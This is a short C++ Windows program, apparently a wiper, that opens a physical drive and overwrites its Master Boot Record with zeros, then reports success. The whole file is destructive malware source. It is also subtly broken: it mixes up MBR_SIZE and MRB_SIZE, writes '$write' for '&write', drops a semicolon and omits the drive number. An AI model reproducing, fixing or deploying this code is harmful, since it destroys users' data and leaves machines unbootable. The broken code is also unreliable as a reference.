#include <Windows.h>
#include <iostream>

using namespace std;

#define MBR_SIZE 512
int main()
{
    DWORD write;
    char mbrData[MRB_SIZE];
    ZeroMemory(&mbrData, (sizeof mbrData));

    HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive"
        , GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE
        , NULL , OPEN_EXISTING , NULL, NULL)
        if (WriteFile(MasterBootRecord, mbrData, MRB_SIZE, $write, NULL) == TRUE) {
            cout << "Master Boot Record is over written!" << endl;
        }
        else {
            cout << "Fail";
            Sleep(5000);
        }
    CloseHandle(MasterBootRecord);

    return EXIT_SUCCESS;
}
